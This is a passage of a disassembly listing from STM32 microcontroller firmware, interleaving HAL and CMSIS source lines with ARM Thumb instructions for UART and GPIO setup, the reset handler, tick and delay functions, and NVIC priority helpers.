 800122c:	d001      	beq.n	8001232 <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 800122e:	f7ff fe6b 	bl	8000f08 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8001232:	bf00      	nop
 8001234:	bd80      	pop	{r7, pc}
 8001236:	bf00      	nop
 8001238:	20000330 	.word	0x20000330
 800123c:	40004400 	.word	0x40004400

08001240 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8001240:	b580      	push	{r7, lr}
 8001242:	b09e      	sub	sp, #120	; 0x78
 8001244:	af00      	add	r7, sp, #0
 8001246:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8001248:	f107 0364 	add.w	r3, r7, #100	; 0x64
 800124c:	2200      	movs	r2, #0
 800124e:	601a      	str	r2, [r3, #0]
 8001250:	605a      	str	r2, [r3, #4]
 8001252:	609a      	str	r2, [r3, #8]
 8001254:	60da      	str	r2, [r3, #12]
 8001256:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8001258:	f107 0310 	add.w	r3, r7, #16
 800125c:	2254      	movs	r2, #84	; 0x54
 800125e:	2100      	movs	r1, #0
 8001260:	4618      	mov	r0, r3
 8001262:	f00b ffff 	bl	800d264 <memset>
  if(uartHandle->Instance==USART2)
 8001266:	687b      	ldr	r3, [r7, #4]
 8001268:	681b      	ldr	r3, [r3, #0]
 800126a:	4a28      	ldr	r2, [pc, #160]	; (800130c <HAL_UART_MspInit+0xcc>)
 800126c:	4293      	cmp	r3, r2
 800126e:	d148      	bne.n	8001302 <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 8001270:	2302      	movs	r3, #2
 8001272:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 8001274:	2300      	movs	r3, #0
 8001276:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8001278:	f107 0310 	add.w	r3, r7, #16
 800127c:	4618      	mov	r0, r3
 800127e:	f003 fa97 	bl	80047b0 <HAL_RCCEx_PeriphCLKConfig>
 8001282:	4603      	mov	r3, r0
 8001284:	2b00      	cmp	r3, #0
 8001286:	d001      	beq.n	800128c <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8001288:	f7ff fe3e 	bl	8000f08 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 800128c:	4b20      	ldr	r3, [pc, #128]	; (8001310 <HAL_UART_MspInit+0xd0>)
 800128e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001290:	4a1f      	ldr	r2, [pc, #124]	; (8001310 <HAL_UART_MspInit+0xd0>)
 8001292:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001296:	6593      	str	r3, [r2, #88]	; 0x58
 8001298:	4b1d      	ldr	r3, [pc, #116]	; (8001310 <HAL_UART_MspInit+0xd0>)
 800129a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800129c:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80012a0:	60fb      	str	r3, [r7, #12]
 80012a2:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 80012a4:	4b1a      	ldr	r3, [pc, #104]	; (8001310 <HAL_UART_MspInit+0xd0>)
 80012a6:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80012a8:	4a19      	ldr	r2, [pc, #100]	; (8001310 <HAL_UART_MspInit+0xd0>)
 80012aa:	f043 0301 	orr.w	r3, r3, #1
 80012ae:	64d3      	str	r3, [r2, #76]	; 0x4c
 80012b0:	4b17      	ldr	r3, [pc, #92]	; (8001310 <HAL_UART_MspInit+0xd0>)
 80012b2:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80012b4:	f003 0301 	and.w	r3, r3, #1
 80012b8:	60bb      	str	r3, [r7, #8]
 80012ba:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 80012bc:	2304      	movs	r3, #4
 80012be:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 80012c0:	2302      	movs	r3, #2
 80012c2:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 80012c4:	2300      	movs	r3, #0
 80012c6:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 80012c8:	2303      	movs	r3, #3
 80012ca:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 80012cc:	2307      	movs	r3, #7
 80012ce:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 80012d0:	f107 0364 	add.w	r3, r7, #100	; 0x64
 80012d4:	4619      	mov	r1, r3
 80012d6:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80012da:	f000 fc67 	bl	8001bac <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 80012de:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80012e2:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 80012e4:	2302      	movs	r3, #2
 80012e6:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 80012e8:	2300      	movs	r3, #0
 80012ea:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 80012ec:	2303      	movs	r3, #3
 80012ee:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 80012f0:	2303      	movs	r3, #3
 80012f2:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 80012f4:	f107 0364 	add.w	r3, r7, #100	; 0x64
 80012f8:	4619      	mov	r1, r3
 80012fa:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80012fe:	f000 fc55 	bl	8001bac <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 8001302:	bf00      	nop
 8001304:	3778      	adds	r7, #120	; 0x78
 8001306:	46bd      	mov	sp, r7
 8001308:	bd80      	pop	{r7, pc}
 800130a:	bf00      	nop
 800130c:	40004400 	.word	0x40004400
 8001310:	40021000 	.word	0x40021000

08001314 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 8001314:	f8df d034 	ldr.w	sp, [pc, #52]	; 800134c <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 8001318:	f7ff fede 	bl	80010d8 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 800131c:	480c      	ldr	r0, [pc, #48]	; (8001350 <LoopForever+0x6>)
  ldr r1, =_edata
 800131e:	490d      	ldr	r1, [pc, #52]	; (8001354 <LoopForever+0xa>)
  ldr r2, =_sidata
 8001320:	4a0d      	ldr	r2, [pc, #52]	; (8001358 <LoopForever+0xe>)
  movs r3, #0
 8001322:	2300      	movs	r3, #0
  b LoopCopyDataInit
 8001324:	e002      	b.n	800132c <LoopCopyDataInit>

08001326 <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 8001326:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 8001328:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 800132a:	3304      	adds	r3, #4

0800132c <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 800132c:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 800132e:	428c      	cmp	r4, r1
  bcc CopyDataInit
 8001330:	d3f9      	bcc.n	8001326 <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 8001332:	4a0a      	ldr	r2, [pc, #40]	; (800135c <LoopForever+0x12>)
  ldr r4, =_ebss
 8001334:	4c0a      	ldr	r4, [pc, #40]	; (8001360 <LoopForever+0x16>)
  movs r3, #0
 8001336:	2300      	movs	r3, #0
  b LoopFillZerobss
 8001338:	e001      	b.n	800133e <LoopFillZerobss>

0800133a <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 800133a:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 800133c:	3204      	adds	r2, #4

0800133e <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 800133e:	42a2      	cmp	r2, r4
  bcc FillZerobss
 8001340:	d3fb      	bcc.n	800133a <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 8001342:	f00b ff97 	bl	800d274 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 8001346:	f7ff fccb 	bl	8000ce0 <main>

0800134a <LoopForever>:

LoopForever:
    b LoopForever
 800134a:	e7fe      	b.n	800134a <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 800134c:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 8001350:	20000000 	.word	0x20000000
  ldr r1, =_edata
 8001354:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 8001358:	0800d538 	.word	0x0800d538
  ldr r2, =_sbss
 800135c:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 8001360:	20001f14 	.word	0x20001f14

08001364 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 8001364:	e7fe      	b.n	8001364 <ADC1_IRQHandler>

08001366 <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 8001366:	b580      	push	{r7, lr}
 8001368:	b082      	sub	sp, #8
 800136a:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 800136c:	2300      	movs	r3, #0
 800136e:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 8001370:	2003      	movs	r0, #3
 8001372:	f000 f961 	bl	8001638 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 8001376:	2000      	movs	r0, #0
 8001378:	f000 f80e 	bl	8001398 <HAL_InitTick>
 800137c:	4603      	mov	r3, r0
 800137e:	2b00      	cmp	r3, #0
 8001380:	d002      	beq.n	8001388 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 8001382:	2301      	movs	r3, #1
 8001384:	71fb      	strb	r3, [r7, #7]
 8001386:	e001      	b.n	800138c <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 8001388:	f7ff fe44 	bl	8001014 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 800138c:	79fb      	ldrb	r3, [r7, #7]
}
 800138e:	4618      	mov	r0, r3
 8001390:	3708      	adds	r7, #8
 8001392:	46bd      	mov	sp, r7
 8001394:	bd80      	pop	{r7, pc}
	...

08001398 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 8001398:	b580      	push	{r7, lr}
 800139a:	b084      	sub	sp, #16
 800139c:	af00      	add	r7, sp, #0
 800139e:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 80013a0:	2300      	movs	r3, #0
 80013a2:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 80013a4:	4b17      	ldr	r3, [pc, #92]	; (8001404 <HAL_InitTick+0x6c>)
 80013a6:	781b      	ldrb	r3, [r3, #0]
 80013a8:	2b00      	cmp	r3, #0
 80013aa:	d023      	beq.n	80013f4 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 80013ac:	4b16      	ldr	r3, [pc, #88]	; (8001408 <HAL_InitTick+0x70>)
 80013ae:	681a      	ldr	r2, [r3, #0]
 80013b0:	4b14      	ldr	r3, [pc, #80]	; (8001404 <HAL_InitTick+0x6c>)
 80013b2:	781b      	ldrb	r3, [r3, #0]
 80013b4:	4619      	mov	r1, r3
 80013b6:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 80013ba:	fbb3 f3f1 	udiv	r3, r3, r1
 80013be:	fbb2 f3f3 	udiv	r3, r2, r3
 80013c2:	4618      	mov	r0, r3
 80013c4:	f000 f96d 	bl	80016a2 <HAL_SYSTICK_Config>
 80013c8:	4603      	mov	r3, r0
 80013ca:	2b00      	cmp	r3, #0
 80013cc:	d10f      	bne.n	80013ee <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 80013ce:	687b      	ldr	r3, [r7, #4]
 80013d0:	2b0f      	cmp	r3, #15
 80013d2:	d809      	bhi.n	80013e8 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 80013d4:	2200      	movs	r2, #0
 80013d6:	6879      	ldr	r1, [r7, #4]
 80013d8:	f04f 30ff 	mov.w	r0, #4294967295
 80013dc:	f000 f937 	bl	800164e <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 80013e0:	4a0a      	ldr	r2, [pc, #40]	; (800140c <HAL_InitTick+0x74>)
 80013e2:	687b      	ldr	r3, [r7, #4]
 80013e4:	6013      	str	r3, [r2, #0]
 80013e6:	e007      	b.n	80013f8 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 80013e8:	2301      	movs	r3, #1
 80013ea:	73fb      	strb	r3, [r7, #15]
 80013ec:	e004      	b.n	80013f8 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 80013ee:	2301      	movs	r3, #1
 80013f0:	73fb      	strb	r3, [r7, #15]
 80013f2:	e001      	b.n	80013f8 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 80013f4:	2301      	movs	r3, #1
 80013f6:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 80013f8:	7bfb      	ldrb	r3, [r7, #15]
}
 80013fa:	4618      	mov	r0, r3
 80013fc:	3710      	adds	r7, #16
 80013fe:	46bd      	mov	sp, r7
 8001400:	bd80      	pop	{r7, pc}
 8001402:	bf00      	nop
 8001404:	20000008 	.word	0x20000008
 8001408:	20000000 	.word	0x20000000
 800140c:	20000004 	.word	0x20000004

08001410 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 8001410:	b480      	push	{r7}
 8001412:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 8001414:	4b06      	ldr	r3, [pc, #24]	; (8001430 <HAL_IncTick+0x20>)
 8001416:	781b      	ldrb	r3, [r3, #0]
 8001418:	461a      	mov	r2, r3
 800141a:	4b06      	ldr	r3, [pc, #24]	; (8001434 <HAL_IncTick+0x24>)
 800141c:	681b      	ldr	r3, [r3, #0]
 800141e:	4413      	add	r3, r2
 8001420:	4a04      	ldr	r2, [pc, #16]	; (8001434 <HAL_IncTick+0x24>)
 8001422:	6013      	str	r3, [r2, #0]
}
 8001424:	bf00      	nop
 8001426:	46bd      	mov	sp, r7
 8001428:	f85d 7b04 	ldr.w	r7, [sp], #4
 800142c:	4770      	bx	lr
 800142e:	bf00      	nop
 8001430:	20000008 	.word	0x20000008
 8001434:	200003b8 	.word	0x200003b8

08001438 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 8001438:	b480      	push	{r7}
 800143a:	af00      	add	r7, sp, #0
  return uwTick;
 800143c:	4b03      	ldr	r3, [pc, #12]	; (800144c <HAL_GetTick+0x14>)
 800143e:	681b      	ldr	r3, [r3, #0]
}
 8001440:	4618      	mov	r0, r3
 8001442:	46bd      	mov	sp, r7
 8001444:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001448:	4770      	bx	lr
 800144a:	bf00      	nop
 800144c:	200003b8 	.word	0x200003b8

08001450 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 8001450:	b580      	push	{r7, lr}
 8001452:	b084      	sub	sp, #16
 8001454:	af00      	add	r7, sp, #0
 8001456:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 8001458:	f7ff ffee 	bl	8001438 <HAL_GetTick>
 800145c:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 800145e:	687b      	ldr	r3, [r7, #4]
 8001460:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 8001462:	68fb      	ldr	r3, [r7, #12]
 8001464:	f1b3 3fff 	cmp.w	r3, #4294967295
 8001468:	d005      	beq.n	8001476 <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 800146a:	4b0a      	ldr	r3, [pc, #40]	; (8001494 <HAL_Delay+0x44>)
 800146c:	781b      	ldrb	r3, [r3, #0]
 800146e:	461a      	mov	r2, r3
 8001470:	68fb      	ldr	r3, [r7, #12]
 8001472:	4413      	add	r3, r2
 8001474:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 8001476:	bf00      	nop
 8001478:	f7ff ffde 	bl	8001438 <HAL_GetTick>
 800147c:	4602      	mov	r2, r0
 800147e:	68bb      	ldr	r3, [r7, #8]
 8001480:	1ad3      	subs	r3, r2, r3
 8001482:	68fa      	ldr	r2, [r7, #12]
 8001484:	429a      	cmp	r2, r3
 8001486:	d8f7      	bhi.n	8001478 <HAL_Delay+0x28>
  {
  }
}
 8001488:	bf00      	nop
 800148a:	bf00      	nop
 800148c:	3710      	adds	r7, #16
 800148e:	46bd      	mov	sp, r7
 8001490:	bd80      	pop	{r7, pc}
 8001492:	bf00      	nop
 8001494:	20000008 	.word	0x20000008

08001498 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001498:	b480      	push	{r7}
 800149a:	b085      	sub	sp, #20
 800149c:	af00      	add	r7, sp, #0
 800149e:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 80014a0:	687b      	ldr	r3, [r7, #4]
 80014a2:	f003 0307 	and.w	r3, r3, #7
 80014a6:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 80014a8:	4b0c      	ldr	r3, [pc, #48]	; (80014dc <__NVIC_SetPriorityGrouping+0x44>)
 80014aa:	68db      	ldr	r3, [r3, #12]
 80014ac:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 80014ae:	68ba      	ldr	r2, [r7, #8]
 80014b0:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 80014b4:	4013      	ands	r3, r2
 80014b6:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 80014b8:	68fb      	ldr	r3, [r7, #12]
 80014ba:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 80014bc:	68bb      	ldr	r3, [r7, #8]
 80014be:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 80014c0:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 80014c4:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 80014c8:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 80014ca:	4a04      	ldr	r2, [pc, #16]	; (80014dc <__NVIC_SetPriorityGrouping+0x44>)
 80014cc:	68bb      	ldr	r3, [r7, #8]
 80014ce:	60d3      	str	r3, [r2, #12]
}
 80014d0:	bf00      	nop
 80014d2:	3714      	adds	r7, #20
 80014d4:	46bd      	mov	sp, r7
 80014d6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80014da:	4770      	bx	lr
 80014dc:	e000ed00 	.word	0xe000ed00

080014e0 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 80014e0:	b480      	push	{r7}
 80014e2:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 80014e4:	4b04      	ldr	r3, [pc, #16]	; (80014f8 <__NVIC_GetPriorityGrouping+0x18>)
 80014e6:	68db      	ldr	r3, [r3, #12]
 80014e8:	0a1b      	lsrs	r3, r3, #8
 80014ea:	f003 0307 	and.w	r3, r3, #7
}
 80014ee:	4618      	mov	r0, r3
 80014f0:	46bd      	mov	sp, r7
 80014f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80014f6:	4770      	bx	lr
 80014f8:	e000ed00 	.word	0xe000ed00

080014fc <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80014fc:	b480      	push	{r7}
 80014fe:	b083      	sub	sp, #12
 8001500:	af00      	add	r7, sp, #0
 8001502:	4603      	mov	r3, r0
 8001504:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001506:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800150a:	2b00      	cmp	r3, #0
 800150c:	db0b      	blt.n	8001526 <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 800150e:	79fb      	ldrb	r3, [r7, #7]
 8001510:	f003 021f 	and.w	r2, r3, #31
 8001514:	4907      	ldr	r1, [pc, #28]	; (8001534 <__NVIC_EnableIRQ+0x38>)
 8001516:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800151a:	095b      	lsrs	r3, r3, #5
 800151c:	2001      	movs	r0, #1
 800151e:	fa00 f202 	lsl.w	r2, r0, r2
 8001522:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 8001526:	bf00      	nop
 8001528:	370c      	adds	r7, #12
 800152a:	46bd      	mov	sp, r7
 800152c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001530:	4770      	bx	lr
 8001532:	bf00      	nop
 8001534:	e000e100 	.word	0xe000e100

08001538 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 8001538:	b480      	push	{r7}
 800153a:	b083      	sub	sp, #12
 800153c:	af00      	add	r7, sp, #0
 800153e:	4603      	mov	r3, r0
 8001540:	6039      	str	r1, [r7, #0]
 8001542:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001544:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001548:	2b00      	cmp	r3, #0
 800154a:	db0a      	blt.n	8001562 <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800154c:	683b      	ldr	r3, [r7, #0]
 800154e:	b2da      	uxtb	r2, r3
 8001550:	490c      	ldr	r1, [pc, #48]	; (8001584 <__NVIC_SetPriority+0x4c>)
 8001552:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001556:	0112      	lsls	r2, r2, #4
 8001558:	b2d2      	uxtb	r2, r2
 800155a:	440b      	add	r3, r1
 800155c:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 8001560:	e00a      	b.n	8001578 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001562:	683b      	ldr	r3, [r7, #0]
 8001564:	b2da      	uxtb	r2, r3
 8001566:	4908      	ldr	r1, [pc, #32]	; (8001588 <__NVIC_SetPriority+0x50>)
 8001568:	79fb      	ldrb	r3, [r7, #7]
 800156a:	f003 030f 	and.w	r3, r3, #15
 800156e:	3b04      	subs	r3, #4
 8001570:	0112      	lsls	r2, r2, #4
 8001572:	b2d2      	uxtb	r2, r2
 8001574:	440b      	add	r3, r1
 8001576:	761a      	strb	r2, [r3, #24]
}
 8001578:	bf00      	nop
 800157a:	370c      	adds	r7, #12
 800157c:	46bd      	mov	sp, r7
 800157e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001582:	4770      	bx	lr
 8001584:	e000e100 	.word	0xe000e100
 8001588:	e000ed00 	.word	0xe000ed00

0800158c <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 800158c:	b480      	push	{r7}
 800158e:	b089      	sub	sp, #36	; 0x24
 8001590:	af00      	add	r7, sp, #0
 8001592:	60f8      	str	r0, [r7, #12]
 8001594:	60b9      	str	r1, [r7, #8]
 8001596:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 8001598:	68fb      	ldr	r3, [r7, #12]
 800159a:	f003 0307 	and.w	r3, r3, #7
 800159e:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 80015a0:	69fb      	ldr	r3, [r7, #28]
 80015a2:	f1c3 0307 	rsb	r3, r3, #7
 80015a6:	2b04      	cmp	r3, #4
 80015a8:	bf28      	it	cs
 80015aa:	2304      	movcs	r3, #4
 80015ac:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 80015ae:	69fb      	ldr	r3, [r7, #28]
 80015b0:	3304      	adds	r3, #4
 80015b2:	2b06      	cmp	r3, #6
 80015b4:	d902      	bls.n	80015bc <NVIC_EncodePriority+0x30>
 80015b6:	69fb      	ldr	r3, [r7, #28]
 80015b8:	3b03      	subs	r3, #3
 80015ba:	e000      	b.n	80015be <NVIC_EncodePriority+0x32>
 80015bc:	2300      	movs	r3, #0
 80015be:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 80015c0:	f04f 32ff 	mov.w	r2, #4294967295
 80015c4:	69bb      	ldr	r3, [r7, #24]
 80015c6:	fa02 f303 	lsl.w	r3, r2, r3
 80015ca:	43da      	mvns	r2, r3
 80015cc:	68bb      	ldr	r3, [r7, #8]
